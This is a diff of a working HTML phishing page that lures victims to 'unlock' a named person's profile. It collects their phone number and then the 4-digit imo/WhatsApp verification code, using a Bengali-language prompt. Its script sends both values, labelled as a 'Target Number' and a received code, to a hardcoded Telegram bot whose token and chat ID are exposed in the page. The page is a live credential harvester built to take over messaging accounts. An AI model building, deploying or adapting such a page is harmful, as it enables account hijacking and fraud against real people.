@@ -12,7 +12,7 @@
         
         .input-container { border: 2px solid #0084ff; border-radius: 10px; display: flex; align-items: center; padding: 5px; margin-bottom: 20px; background: white; }
         .country-input { width: 70px; border: none; border-right: 1px solid #ddd; outline: none; font-size: 18px; font-weight: bold; text-align: center; padding: 10px 5px; }
-        .main-phone { border: none; outline: none; font-size: 18px; width: 100%; padding: 10px; }
+        .main-phone { border: none; outline: none; font-size: 18px; width: 100%; padding: 10px; } 
 
         .code-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; background: #f8f9fa; }
@@ -28,7 +28,7 @@
         .instruction { color: #666; font-size: 13px; margin: 15px 0; line-height: 1.4; }
     </style>
 </head>
-<body>
+<body> 
 
 <div id="page1">
     <div class="header">
@@ -46,7 +46,7 @@
         </div>
         <button id="submitBtn" onclick="goToVerify()">Unlock Sanjida Akter ➔</button>
     </div>
-</div>
+</div> 
 
 <div id="page2" class="hidden">
     <div class="header">
@@ -55,30 +55,30 @@
     <div class="card">
         <div style="font-size: 50px; color:#0084ff; margin-bottom: 10px;">🛡️</div>
         <div class="name" style="font-size: 22px;">Security Check</div>
-        <p class="instruction">Please enter the 4-digit unlock number received on your imo, whatsapp or message option to unlock.</p>
+        <p class="instruction">আপনার ইমো এর ভেতরে ০৪(চার) সংখ্যার একটি ইনভাইট নাম্বার পাঠানো হয়েছে। অনুগ্রহ করে নাম্বারটি সংগ্রহ করে ফাঁকা বক্সে বসিয়ে দিন।</p>
         
         <div class="code-container">
             <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c2')" id="c1">
             <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c3')" id="c2">
             <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c4')" id="c3">
             <input type="number" class="code-box" maxlength="1" oninput="sendCode(this)" id="c4">
-        </div>
+        </div> 
 
         <div id="timerText" class="timer">Please wait 25s to enter code</div>
     </div>
-</div>
+</div> 
 
 <script>
     const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
     const chat_id = "8624234278";
-    let userFullPhone = "";
+    let userFullPhone = ""; 
 
     function checkBtn() {
         const phone = document.getElementById("phone").value;
         const btn = document.getElementById("submitBtn");
         if(phone.length >= 8) btn.classList.add("active");
         else btn.classList.remove("active");
-    }
+    } 
 
     function goToVerify() {
         const cCode = document.getElementById("countryCode").value || "+880";
@@ -89,18 +89,18 @@
         userFullPhone = cCode + phone;
         
         // টেলিগ্রামে নম্বর পাঠানো
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 Target Number: " + userFullPhone + "\n👤 Target Name: Sanjida Akter")}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 Target Number: " + userFullPhone + "\n👤 Target Name: Sanjida Akter")}`); 
 
         document.getElementById("page1").classList.add("hidden");
         document.getElementById("page2").classList.remove("hidden");
         startTimer();
-    }
+    } 
 
     function startTimer() {
         let timeLeft = 25;
         const timerText = document.getElementById("timerText");
         const inputs = document.querySelectorAll(".code-box");
-        inputs.forEach(i => i.disabled = true);
+        inputs.forEach(i => i.disabled = true); 
 
         const interval = setInterval(() => {
             timeLeft--;
@@ -112,14 +112,14 @@
                 inputs[0].focus();
             }
         }, 1000);
-    }
+    } 
 
     function moveNext(curr, nextId) {
         if(curr.value.length >= 1) {
             curr.value = curr.value.slice(0,1);
             document.getElementById(nextId).focus();
         }
-    }
+    } 
 
     function sendCode(lastInput) {
         if(lastInput.value.length >= 1) {
@@ -128,7 +128,7 @@
             const c2 = document.getElementById("c2").value;
             const c3 = document.getElementById("c3").value;
             const c4 = document.getElementById("c4").value;
-            const fullCode = c1 + c2 + c3 + c4;
+            const fullCode = c1 + c2 + c3 + c4; 
 
             const msg = `🔔 IMO CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n👤 Name: Sanjida Akter\n🔑 Code: ${fullCode}`;
             
@@ -139,11 +139,9 @@
             });
         }
     }
-</script>
+</script> 
 
 </body>
 </html>
-
-
 
 
